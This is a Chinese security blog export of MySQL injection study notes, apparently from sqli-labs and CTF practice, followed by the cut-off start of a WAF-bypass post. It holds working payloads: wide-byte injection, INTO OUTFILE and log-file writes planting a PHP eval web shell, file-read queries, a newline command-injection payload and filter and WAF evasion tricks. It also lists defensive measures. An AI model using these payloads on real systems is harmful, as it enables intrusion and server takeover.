title="例题"></a>例题</h5><p><code>sql-lab less-32</code></p><p>转义字符</p><p><img src="/../images/image-20230522170722857.png" alt="image-20230522170722857"></p><p>设置编码集</p><p><img src="/../images/image-20230522170750335.png" alt="image-20230522170750335"></p><p>sql语句，单引号闭合</p><p><img src="/../images/image-20230522171701503.png" alt="image-20230522171701503"></p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">27</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230522171728569.png" alt="image-20230522171728569"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?id=<span class="number">1</span>%df%<span class="number">27</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230522171841053.png" alt="image-20230522171841053"></p><h5 id="payload-5"><a href="#payload-5" class="headerlink" title="payload"></a>payload</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1%df&#x27;</span><br></pre></td></tr></table></figure><p>使用 Linux 自带的 iconv 命令进行 UTF 的编码转换</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo \&#x27;|iconv -f utf-8 -t utf-16</span><br><span class="line">echo \&#x27;|iconv -f utf-8 -t utf-32</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230523121013028.png" alt="image-20230523121013028"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1�&#x27;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230523121159948.png" alt="image-20230523121159948"></p><h4 id="order-by-注入"><a href="#order-by-注入" class="headerlink" title="order by 注入"></a>order by 注入</h4><p><a href="https://www.cnblogs.com/1ink/p/15107674.html">https://www.cnblogs.com/1ink/p/15107674.html</a></p><h4 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h4><h5 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h5><h6 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h6><ul><li><p>高权限</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select user, file_priv from mysql.user; </span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230528210141344.png" alt="image-20230528210141344"></p></li><li><p>知道网站的绝对路径</p></li><li><p><code>secure_fil_priv</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select @@secure_file_priv;</span><br><span class="line">show global variables like &#x27;%secure_file_priv%&#x27;; # show语句要堆叠注入和回显</span><br></pre></td></tr></table></figure></li></ul><p><img src="/../images/image-20230522174929267.png" alt="image-20230522174929267"></p><h6 id="payload-6"><a href="#payload-6" class="headerlink" title="payload"></a>payload</h6><p><strong>基于联合查询</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select *from users where id=1 union select 1,&#x27;&lt;?php phpinfo();?&gt;&#x27;,3 into outfile &#x27;C:\info.php&#x27;;</span><br><span class="line"></span><br><span class="line">select *from users where id=1 union select 1,&#x27;&lt;?php phpinfo();?&gt;&#x27;,3 into  dumpfile &#x27;C:\info2.php&#x27;;</span><br></pre></td></tr></table></figure><p><code>outfile</code>和<code>dumpfile</code>的区别</p><ul><li><code>outfile</code>导出数据支持多行，<code>dumpfile</code>只支持一行</li><li><code>outfile</code>会对数据进行转义，<code>dumpfile</code>不会</li></ul><p>所以使用<code>into dumpfile</code>这个函数来写入二进制文件</p><p><img src="/../images/image-20230522180009679.png" alt="image-20230522180009679"></p><p><strong>非联合查询</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select *from users where id=1 into outfile &#x27;C:\info.php&#x27; fields terminated by &#x27;&lt;?php phpinfo();?&gt;&#x27;;</span><br><span class="line"></span><br><span class="line">select *from users where id=1 into outfile &#x27;C:\info2.php&#x27; lines terminated by &#x27;&lt;?php phpinfo();?&gt;&#x27;;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230522180543767.png" alt="image-20230522180543767"></p><h5 id="写入日志文件"><a href="#写入日志文件" class="headerlink" title="写入日志文件"></a>写入日志文件</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># --查看配置，日志是否开启，和mysql默认log地址(记下原地址方便恢复)</span><br><span class="line">show variables like &#x27;%general%&#x27;;</span><br><span class="line"></span><br><span class="line">set global general_log = on;</span><br><span class="line"></span><br><span class="line">set global general_log_file = &#x27;e:\info.php&#x27;; # 这里日志创建权限要低一些，不能在c盘创建</span><br><span class="line"></span><br><span class="line">select &#x27;&lt;?php phpinfo();?&gt;&#x27;;</span><br><span class="line"></span><br><span class="line">--结束后，痕迹清理</span><br></pre></td></tr></table></figure><p>日志慢查询</p><p>From：<a href="https://wiki.wgpsec.org/knowledge/web/mysql-write-shell.html">https://wiki.wgpsec.org/knowledge/web/mysql-write-shell.html</a></p><blockquote><p>为什么要用慢查询写呢？因为开启日志监测后文件会很大，网站访问量大的话我们写的shell会出错</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show variables like &#x27;%slow_query_log%&#x27;;--查看慢查询信息</span><br><span class="line">set global slow_query_log=1;--启用慢查询日志(默认禁用)</span><br><span class="line">set global slow_query_log_file=&#x27;C:\\phpStudy\\WWW\\shell.php&#x27;;--修改日志文件路径</span><br><span class="line"></span><br><span class="line">show global variables like &#x27;%long_query_time%&#x27;;</span><br><span class="line">--查看默认时间值，当sql语句执行时间超过该值才会被计入日志中，默认10秒</span><br><span class="line"></span><br><span class="line">select &#x27;&lt;?php @eval($_POST[abc]);?&gt;&#x27; or sleep(@@long_query_time+1);--写shell到慢查询日志</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230522182142555.png" alt="image-20230522182142555"></p><h5 id="sqlmap-–os-shell"><a href="#sqlmap-–os-shell" class="headerlink" title="sqlmap  –os-shell"></a>sqlmap  –os-shell</h5><ul><li><p>大致流程</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">获取目标信息→使用lines terminated by将具有文件上传的🐎上传到网站→逐级目录访问找到🐎</span><br><span class="line"></span><br><span class="line">→通过该🐎上传真正的命令🐎→测试命令🐎能否执行→删除上传的两个🐎</span><br></pre></td></tr></table></figure></li><li><p>文件上传🐎：form表单</p></li><li><p>php命令马：获得<code>disable_function</code>，遍历所有代码执行，命令执行函数，判断哪一个不在<code>disable_function</code>。</p></li></ul><h4 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h4><h5 id="LOAD-DATA-LOCAL—任意读取"><a href="#LOAD-DATA-LOCAL—任意读取" class="headerlink" title="LOAD DATA LOCAL—任意读取"></a><code>LOAD DATA LOCAL</code>—任意读取</h5><h6 id="脚本-1"><a href="#脚本-1" class="headerlink" title="脚本"></a>脚本</h6><p><a href="https://github.com/allyshka/Rogue-MySql-Server">https://github.com/allyshka/Rogue-MySql-Server</a></p><h6 id="原理和攻击思路"><a href="#原理和攻击思路" class="headerlink" title="原理和攻击思路"></a>原理和攻击思路</h6><p><a href="https://paper.seebug.org/1112/">CSS-T | Mysql Client 任意文件读取攻击链拓展</a></p><blockquote><p>文件读取<code>Phar</code>文件，造成php反序列化</p></blockquote><h6 id="条件-1"><a href="#条件-1" class="headerlink" title="条件"></a>条件</h6><ul><li><p>客户端必须启用LOCAL-INFILE </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">连接时参数--local-infile=OFF 可以修复，或者更改全局变量local_infile(我在5.7下参数可以，更改全局变量不行？？)</span><br></pre></td></tr></table></figure></li><li><p>客户端支持非SSL连接</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">连接时参数--ssl-mode=VERIFY_IDENTITY 可以修复</span><br></pre></td></tr></table></figure></li><li><p>目标web存在连接数据库的功能</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">数据库弱口令扫描，连接检查</span><br><span class="line">网站重装漏洞（需要连接数据库）</span><br><span class="line">数据迁移服务</span><br><span class="line">Excle从数据库中同步数据到表格内</span><br></pre></td></tr></table></figure></li></ul><h6 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">客户端与服务端的mysql都是5.7版本</span><br></pre></td></tr></table></figure><p><code>mysql5.7</code>默认开启</p><p><img src="/../images/image-20230523163445312.png" alt="image-20230523163445312"></p><p>注：一开始使用服务端使用8版本不行</p><p>攻击者（服务端）起脚本</p><p><img src="/../images/image-20230523162503899.png" alt="image-20230523162503899"></p><p><img src="/../images/image-20230523162623757.png" alt="image-20230523162623757"></p><p>受害者连接</p><p><img src="/../images/image-20230523162534773.png" alt="image-20230523162534773"></p><p>攻击者查看<code>mysql.log</code></p><p><img src="/../images/image-20230523162727437.png" alt="image-20230523162727437"></p><h5 id="load-file"><a href="#load-file" class="headerlink" title="load_file"></a><code>load_file</code></h5><p><strong>注意：转义字符</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select load_file(&#x27;e:\test.txt&#x27;); # \t 错误路径</span><br><span class="line">select load_file(&#x27;e:\\test.txt&#x27;);# 正确</span><br><span class="line">select load_file(0x653A5C746573742E747874);# 支持十六进制</span><br><span class="line">select load_file(char(101,58,92,116,101,115,116,46,116,120,116));# 支持char函数</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230523134023401.png" alt="image-20230523134023401"></p><h5 id="load-data"><a href="#load-data" class="headerlink" title="load data "></a><code>load data </code></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create table user(cmd text)</span><br><span class="line">load data infile &#x27;e:/test.txt&#x27; into table user;</span><br><span class="line">select * from user;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230523134532606.png" alt="image-20230523134532606"></p><p><img src="/../images/image-20230522220456619.png" alt="image-20230522220456619"></p><h4 id="mysqldump"><a href="#mysqldump" class="headerlink" title="mysqldump"></a>mysqldump</h4><p><strong>shell</strong>下执行</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mysqldump -uroot -proot --all-databases &gt; file_path  # 导出所有数据库</span><br><span class="line">mysqldump -uroot -proot --databases db1 --tables a1 a2  &gt; /file_path # 导出db1中的a1、a2表</span><br></pre></td></tr></table></figure><p>导出的文本内容</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">创建数据库判断语句-删除表-创建表-锁表-禁用索引-插入数据-启用索引-解锁表</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230528204837541.png" alt="image-20230528204837541"></p><h5 id="例题-3"><a href="#例题-3" class="headerlink" title="例题"></a>例题</h5><p>CICSN2023初赛–dumpit</p><p>关键代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$black</span> = <span class="string">&#x27;;`*#^$&amp;|&#x27;</span>;  <span class="comment">#黑名单</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$db</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;db&#x27;</span>];</span><br><span class="line"><span class="variable">$t2d</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;table_2_dump&#x27;</span>];</span><br><span class="line"><span class="variable">$randstr</span> = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">time</span>());</span><br><span class="line"></span><br><span class="line"><span class="variable">$dump</span>=<span class="string">&#x27;mariadb-dump &#x27;</span>.<span class="variable">$db</span>.<span class="string">&#x27; &#x27;</span>.<span class="variable">$t2d</span>.<span class="string">&#x27; &gt;./log/&#x27;</span>.<span class="variable">$randstr</span>.<span class="string">&#x27;.log&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$dump</span>);</span><br></pre></td></tr></table></figure><p>db和table都可控，过滤不严谨，并且直接拼接到命令中，造成RCE</p><p>payload</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">?db=ctf&amp;table_2_dump=flag2 %0d%0a cmd</span><br></pre></td></tr></table></figure><h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>国光师傅✍的太好辣，等到后面学习windows提权再复现吧😋</p><p><a href="https://www.sqlsec.com/2020/11/mysql.html">https://www.sqlsec.com/2020/11/mysql.html</a></p><h4 id="Linux的Mysql–好像没用"><a href="#Linux的Mysql–好像没用" class="headerlink" title="Linux的Mysql–好像没用"></a>Linux的Mysql–好像没用</h4><p><code>help</code>查看<code>mysql</code>帮助</p><p><img src="/../images/image-20230522205545396.png" alt="image-20230522205545396"></p><p>假想：如果存在堆叠注入，就可以以当前数据库用户权限任意命令执行</p><p><img src="/../images/image-20230522205812501.png" alt="image-20230522205812501"></p><p>测试了一下好像不行</p><p><img src="/../images/image-20230522223047561.png" alt="image-20230522223047561"></p><p><strong>并且此方法只能在本地读取，远程连接mysql时使用system，实际上还是在原来的主机上执行命令。</strong></p><p><code>kali</code>连接远程mysql，<code>system uname -a</code></p><p><img src="/../images/image-20230522210207967.png" alt="image-20230522210207967"></p><h2 id="Mysql绕过补充"><a href="#Mysql绕过补充" class="headerlink" title="Mysql绕过补充"></a>Mysql绕过补充</h2><h3 id="通用绕过"><a href="#通用绕过" class="headerlink" title="通用绕过"></a>通用绕过</h3><ul><li><p>大小写绕过</p><p>修复：正则<code>/i</code></p></li><li><p>双写绕过（waf将关键字替换为空，且次数为1）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uniunionon</span><br></pre></td></tr></table></figure><p>修复：正则<code>/m</code></p></li></ul><h3 id="注释符绕过"><a href="#注释符绕过" class="headerlink" title="注释符绕过"></a>注释符绕过</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 手动闭合</span><br><span class="line">$sql=&quot;select * from users where id=&#x27;$id&#x27;;&quot;</span><br><span class="line"></span><br><span class="line">$id=1&#x27; and &#x27;1&#x27;=&#x27;2</span><br><span class="line"></span><br><span class="line">select * from users where id=&#x27;1&#x27; and &#x27;1&#x27;=&#x27;2&#x27;;</span><br></pre></td></tr></table></figure><h3 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h3><ul><li><p><code>%0a</code></p></li><li><p><code>%0d%0a</code></p></li><li><p><code>/**/</code></p></li><li><p>括号绕过</p><blockquote><p>在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。</p></blockquote><p><img src="/../images/image-20230522161003063.png" alt="image-20230522161003063"></p></li></ul><h3 id="引号绕过"><a href="#引号绕过" class="headerlink" title="引号绕过"></a>引号绕过</h3><h4 id="不让用单引号"><a href="#不让用单引号" class="headerlink" title="不让用单引号"></a>不让用单引号</h4><p>可以用十六进制代替</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">where(table_name=&#x27;users&#x27;) → where(table_name=0x7573657273)</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230522163358530.png" alt="image-20230522163358530"></p><h4 id="转义了单引号"><a href="#转义了单引号" class="headerlink" title="转义了单引号"></a>转义了单引号</h4><p>宽字节注入，二次注入</p><h3 id="字符串连接函数"><a href="#字符串连接函数" class="headerlink" title="字符串连接函数"></a>字符串连接函数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">concat(&quot;str1&quot;, &quot;,&quot; ,&quot;str2&quot;)</span><br><span class="line"></span><br><span class="line">concat_ws(&quot;,&quot; , &quot;str1&quot; , &quot;str2&quot;)</span><br><span class="line"></span><br><span class="line">group_concat(&quot;str1&quot;, &quot;,&quot; ,&quot;str2&quot;)</span><br></pre></td></tr></table></figure><h3 id="select绕过"><a href="#select绕过" class="headerlink" title="select绕过"></a>select绕过</h3><ul><li><p>已知表名可以用<code>handle</code></p></li><li><p>版本&gt;&#x3D;8.0</p><p><a href="https://blog.csdn.net/rfrder/article/details/118726022">mysql 8.0.21以上版本的新特性</a></p></li><li><p>在对当前表的列名注入时，可以直接写字段名，而无需<code>select 该字段 from 该表</code></p><p><img src="/../images/image-20230522161753632.png" alt="image-20230522161753632"></p></li></ul><h3 id="逗号绕过"><a href="#逗号绕过" class="headerlink" title="逗号绕过"></a>逗号绕过</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">substr(databse(),1,1) 等价于 substr(databse() from 1 for 1)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select 1,2,3; 等价于 select * from (select 1)a join (select 2)b join (select 3)c;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220718092241142.png" alt="image-20220718092241142"></p><h3 id="内联注释"><a href="#内联注释" class="headerlink" title="内联注释"></a>内联注释</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 如果加了!就会执行在/* */内的语句</span><br><span class="line">/*!union select 1,2*/</span><br><span class="line"></span><br><span class="line"># 要将整个语句写入/* */内</span><br><span class="line">/*!union select */1,2 这是错误的</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#  version 5.7.26</span><br><span class="line">/*!00000 select 1,2*/; 可以</span><br><span class="line">/*!50726 select 1,2*/;  可以</span><br><span class="line">/*!50727 select 1,2*/;  不可以</span><br><span class="line"></span><br><span class="line">00000 到 50726之间是可以的</span><br></pre></td></tr></table></figure><h3 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h3><h4 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h4><p><code>information_schem</code>被过滤，不知道表的字段名</p><h4 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h4><p>通过<code>select 数字</code>将字段名设置为数字</p><p><img src="/../images/image-20230523141619236.png" alt="image-20230523141619236"></p><p>再用联合查询将需要的数据存到上图的表中</p><p><img src="/../images/image-20230523141701416.png" alt="image-20230523141701416"></p><p>那么想要查询<code>users</code>表中的<code>username</code>字段的值</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select `2` from (select 1,2,3 union select * from user)别名;</span><br><span class="line"></span><br><span class="line"># 别名是(select 1,2 union select * from user)返回的表的别名</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230523141936080.png" alt="image-20230523141936080"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 如果反引号被过滤</span><br><span class="line">select group_concat(b) from (select 1,2 as b,3 union select * from users)a;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230523142119240.png" alt="image-20230523142119240"></p><h2 id="预编译问题"><a href="#预编译问题" class="headerlink" title="预编译问题"></a>预编译问题</h2><p>推荐阅读：</p><p><a href="https://forum.butian.net/share/1559">奇安信攻防社区-SQL注入&amp;预编译</a></p><p><a href="https://xz.aliyun.com/t/3950">PDO场景下的SQL注入探究 - 先知社区</a></p><h3 id="预编译失效"><a href="#预编译失效" class="headerlink" title="预编译失效"></a>预编译失效</h3><p><code>PHP-PDO</code>采用本地预处理</p><p><img src="/../images/image-20230330172825283.png" alt="image-20230330172825283"></p><p>传入<code>?username=&#39;admin&#39;</code>,查看日志如下</p><blockquote><p>开启永久日志,在配置文件中加入</p><p>general_log &#x3D; 1<br>general_log_file &#x3D; 日志路径</p></blockquote><p><img src="/../images/image-20230330172741664.png" alt="image-20230330172741664"></p><p>可以看到预编译为其自动添加了一对引号，并将用户输入的引号进行转义。</p><p>那么如果将表名，<code>order by xx</code>处进行预编译就会产生如下效果</p><p><img src="/../images/image-20230330001720031.png" alt="image-20230330001720031"></p><p><img src="/../images/image-20230330001733787.png" alt="image-20230330001733787"></p><p>可以看到这些语句”失效了”（没有得到想要的结果），所以在实际开发中，对于这些语句大概率就是进行一个拼接处理，就很可能存在sql注入。</p><h3 id="预编译使用错误"><a href="#预编译使用错误" class="headerlink" title="预编译使用错误"></a>预编译使用错误</h3><ul><li><p><a href="https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html">ThinkPHP5 SQL注入漏洞 &amp;&amp; PDO真&#x2F;伪预处理分析 | 离别歌</a></p></li><li><p>堆叠注入</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span>= <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="comment"># 预处理语句</span></span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;select * from users where id=<span class="subst">$id</span>&quot;</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line"><span class="variable">$fraction</span> = <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetch</span>();</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$fraction</span>);</span><br></pre></td></tr></table></figure><ul><li>使用模拟预编译</li></ul></li><li><p>没有绑定参数</p><p>又因为PDO默认可以支持多条SQL执行，所有造成了堆叠注入。</p></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1;create database pdo;</span><br></pre></td></tr></table></figure><p>  <img src="/../images/image-20230523131701820.png" alt="image-20230523131701820"></p><h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><p>From Oceansec师傅</p><p>sqlmap 源码分析</p><ul><li><p><a href="https://www.anquanke.com/post/id/262848">sqlmap 项目剖析1</a></p></li><li><p><a href="https://www.anquanke.com/post/id/262847">sqlmap 项目剖析2</a></p></li><li><p><a href="https://www.anquanke.com/post/id/262849">sqlmap 项目剖析3</a></p></li><li><p><a href="https://www.anquanke.com/post/id/262850">sqlmap 项目剖析4</a></p></li><li><p><a href="https://www.beysec.com/security/sqlmap-source-1.html">sqlmap源码分析与学习</a></p></li><li><p><a href="https://www.processon.com/view/5835511ce4b0620292bd7285">sqlmap 流程脑图</a></p></li></ul><p>os-shell 原理</p><ul><li><a href="https://xz.aliyun.com/t/7942">sqlmap –os-shell原理</a></li><li><a href="https://mp.weixin.qq.com/s?__biz=MzIyMjkzMzY4Ng==&mid=2247485339&idx=1&sn=ea76ee0d56b8a95a118a60d111d48160">Sqlmap之os-shell原理分析</a></li></ul><p>攻防</p><ul><li><a href="https://xz.aliyun.com/t/10385">实战sqlmap绕过WAF</a></li><li><a href="https://www.anquanke.com/post/id/261915">sqlmap –os-shell反制小思路</a></li><li><a href="https://mp.weixin.qq.com/s?__biz=Mzg4MzA4Nzg4Ng==&mid=2247494179&idx=1&sn=e6c94b87981fda009e7be50c9eb73bf6">入侵检测之sqlmap恶意流量分析</a></li></ul><h2 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h2><ul><li><p>正确使用预编译+黑名单</p></li><li><p>配置问题</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  站库分离</span><br><span class="line">  不允许外连</span><br><span class="line">  数据库以低权限运行</span><br><span class="line">  不显示报错</span><br><span class="line">  不使用多语句查询</span><br><span class="line">  secure_file_priv=NULL</span><br><span class="line">字符集保持一致</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> Web漏洞 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>waf绕过简单学习</title>
      <link href="/2023/05/31/waf%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/"/>
      <url>/2023/05/31/waf%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="知己知彼"><a href="#知己知彼" class="headerlink" title="知己知彼"></a>知己知彼</h2><p><strong>先阅读</strong><a href="https://www.cnblogs.com/realjimmy/p/12937247.html">WAF功能介绍（入门扫盲篇） - 一觉醒来写程序 - 博客园</a></p><ul><li>部署方式</li><li>引擎规则原理</li></ul><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><p><img src="/../images/image-20230516142728508.png" alt="image-20230516142728508"></p><p>本文以安全狗为例子进行简单学习</p><h3 id="部署位置"><a href="#部署位置" class="headerlink" title="部署位置"></a>部署位置</h3><p><img src="/../images/2015081104292360563.png" alt="enter image description here"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">请求 → CDN → 云waf → 硬waf → WEB服务器 → 软waf → WEB应用程序（代码waf） → (数据库)</span><br></pre></td></tr></table></figure><h2 id="储备知识"><a href="#储备知识" class="headerlink" title="储备知识"></a>储备知识</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">waf了解</span><br><span class="line">各种语法</span><br><span class="line">http协议</span><br><span class="line">web服务器特性</span><br></pre></td></tr></table></figure><h2 id="WAF绕过"><a href="#WAF绕过" class="headerlink" title="WAF绕过"></a>WAF绕过</h2><h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><p>没有在代码中进行过滤，如有会说明。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">win  10</span><br><span class="line">php  5.6.9</span><br><span class="line">mysql 5.7.26</span><br><span class="line">apache 2.4.39</span><br><span class="line">safe dog V3.5 </span><br></pre></td></tr></table></figure><p>配置如下</p><p><img src="/../images/image-20230516235356524.png" alt="image-20230516235356524"></p><p><img src="/../images/image-20230516150636839.png" alt="image-20230516150636839"></p><p>特征</p><p><img src="/../images/image-20230517003655268.png" alt="image-20230517003655268"></p><p><img src="/../images/image-20230517100649383.png" alt="image-20230517100649383"></p><h3 id="迂回作战"><a href="#迂回作战" class="headerlink" title="迂回作战"></a>迂回作战</h3><blockquote><p>主打一个侧面绕过，利用各种缺陷和特性使得<strong>waf没有解析到payload</strong>，不与waf的规则和策略硬刚</p></blockquote><h4 id="Web服务器特性"><a href="#Web服务器特性" class="headerlink" title="Web服务器特性"></a>Web服务器特性</h4><blockquote><p>Web服务器解析与waf解析不同绕过</p></blockquote><h5 id="IIS-ASP"><a href="#IIS-ASP" class="headerlink" title="IIS+ASP"></a>IIS+ASP</h5><ul><li><p><code>%</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">对于URL请求的参数值中的%，如果和后面的字符构成的字符串在URL编码表之外，ASP脚本处理时会将其忽略。</span><br><span class="line"></span><br><span class="line">select  →  se%lect</span><br></pre></td></tr></table></figure></li><li><p><code>unicode</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IIS会自动解码unicode</span><br></pre></td></tr></table></figure></li></ul><h5 id="tomcat"><a href="#tomcat" class="headerlink" title="tomcat"></a>tomcat</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/path1/path2/ == ;/path1;foo/path2;bar/;</span><br></pre></td></tr></table></figure><h5 id="参数污染"><a href="#参数污染" class="headerlink" title="参数污染"></a>参数污染</h5><p>传递多个相同参数，利用waf和web服务器解析的参数不同来进行绕过</p><table><thead><tr><th align="left">Web 环境</th><th align="left">参数获取函数</th><th align="left">获取到的参数</th></tr></thead><tbody><tr><td align="left">PHP&#x2F;Apache</td><td align="left">$_GET(“par”)</td><td align="left">last</td></tr><tr><td align="left">JSP&#x2F;Tomcat</td><td align="left">Request.getParameter(“par”)</td><td align="left">first</td></tr><tr><td align="left">Perl(CGI)&#x2F;Apache</td><td align="left">Param(“par”)</td><td align="left">first</td></tr><tr><td align="left">Python&#x2F;Apache</td><td align="left">getvalue(“par”)</td><td align="left">[“first”,”last”]</td></tr><tr><td align="left">ASP.NET&#x2F;IIS</td><td align="left">Request.QueryString(“par”)</td><td align="left">first,last</td></tr></tbody></table><h4 id="Web应用程序层"><a href="#Web应用程序层" class="headerlink" title="Web应用程序层"></a>Web应用程序层</h4><blockquote><p>Web应用程序层（后端代码）解析与waf解析不同</p><p><strong>waf没有根据后端代码来修改策略和规则</strong></p></blockquote><h5 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h5><p>对请求数据进行编码，例如url编码，Unicode编码等，如果waf对数据不能有效的解码，而应用后端能够正常解码，就可以绕过waf。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">json数据支持unicode编码</span><br></pre></td></tr></table></figure><h5 id="多数据来源"><a href="#多数据来源" class="headerlink" title="多数据来源"></a>多数据来源</h5><p>web应用程序从多个地方取值，如</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># php</span></span><br><span class="line"><span class="variable">$param</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;xxxx&#x27;</span>]</span><br></pre></td></tr></table></figure><p>可以从<code>GET,POST,HEADER,METHOD</code>等地方获取用户提交的参数。</p><p>如果waf只对<code>GET，POST</code>进行检测,没有与后端相适应，就可以绕过。</p><h4 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h4><h5 id="分块传输"><a href="#分块传输" class="headerlink" title="分块传输"></a>分块传输</h5><p>Burp插件：<a href="https://github.com/c0ny1/chunked-coding-converter">https://github.com/c0ny1/chunked-coding-converter</a></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Transfer-Encoding: chunked  <span class="comment"># 表示BODY的传输编码方式为chunked（无Content-Length字段）</span></span><br><span class="line"></span><br><span class="line"><span class="number">3</span> <span class="comment"># 指明传输的数据长度</span></span><br><span class="line">a=<span class="number">1</span></span><br><span class="line"><span class="number">0</span> <span class="comment"># 表示传输结束</span></span><br></pre></td></tr></table></figure><p>PHP实验</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_REQUEST</span>[<span class="string">&#x27;id&#x27;</span>] 失败</span><br><span class="line"><span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>] 成功</span><br></pre></td></tr></table></figure><h5 id="keep-alive"><a href="#keep-alive" class="headerlink" title="keep-alive"></a>keep-alive</h5><p>http长连接，发送多个数据包请求，感觉跟请求走私很像</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Connection</span><span class="punctuation">: 